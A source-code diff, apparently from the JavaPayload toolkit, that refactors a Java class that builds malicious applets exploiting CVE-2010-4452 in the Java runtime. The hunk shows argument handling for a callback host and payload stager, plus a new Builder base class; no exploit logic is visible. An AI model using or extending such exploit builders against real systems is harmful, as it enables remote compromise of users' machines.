@@ -61,13 +61,29 @@ import org.objectweb.asm.MethodAdapter;
 import org.objectweb.asm.MethodVisitor;
 import org.objectweb.asm.Opcodes;
 
-public class CVE_2010_4452_AppletClassBuilder {
+public class CVE_2010_4452_AppletClassBuilder extends Builder {
 
 	public static void main(String[] args) throws Exception {
-		if (args.length != 1 && args.length != 2) {
-			System.out.println("Usage: java javapayload.builder.CVE_2010_4452_AppletClassBuilder <host> <stager> [<classname>]");
+		if (args.length != 2 && args.length != 3) {
+			System.out.println("Usage: java javapayload.builder.CVE_2010_4452_AppletClassBuilder "+new CVE_2010_4452_AppletClassBuilder().getParameterSyntax());
 			return;
 		}
+		new CVE_2010_4452_AppletClassBuilder().build(args);
+	}
+
+	private CVE_2010_4452_AppletClassBuilder() throws Exception {
+		super("Build an applet that exploits CVE-2010-4452", "Use the source, Luke!");
+	}
+	
+	public String getParameterSyntax() {
+		return "<host> <stager> [<classname>]";
+	}
+	
+	protected int getMinParameterCount() {
+		return 2;
+	}
+	
+	public void build(String[] args) throws Exception {
 		String host = args[0];
 		if (host.indexOf('.') != -1) {
 			byte[] ip = InetAddress.getByName(args[0]).getAddress();
